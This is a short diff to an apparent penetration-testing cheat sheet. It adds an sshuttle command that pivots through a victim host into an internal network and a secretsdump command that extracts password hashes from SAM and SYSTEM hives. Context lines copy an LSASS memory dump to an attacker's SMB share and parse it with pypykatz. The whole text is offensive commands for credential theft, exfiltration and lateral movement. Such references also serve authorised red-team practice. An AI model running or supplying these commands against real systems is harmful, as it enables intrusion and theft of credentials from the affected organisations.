@@ -174,7 +174,10 @@ Victime Machine
 # defaults set to "tor"
 socks5 127.0.0.1 ATTACKER_PORT
 ```
-
+#### sshuttle
+```
+sshuttle -r VICTIM_USER@VICTIM_IP --ssh-cmd 'ssh -i id_rsa' INTERNAL/NETWORK -x ATTACKER_IP
+```
 ### DNS
 
 #### dnsenum
@@ -957,6 +960,12 @@ cp lsass.dump \\IP_ATACANTE\smbFolder\lsass.dmp
 Pars the lsass.dmp
 ```
 pypykatz lsa minidump lsass.dmp
+```
+
+### Decrypt SAM
+secretsdump
+```
+secretsdump.py -sam sam -system system LOCAL
 ```
 ### ldapdomaindump
 
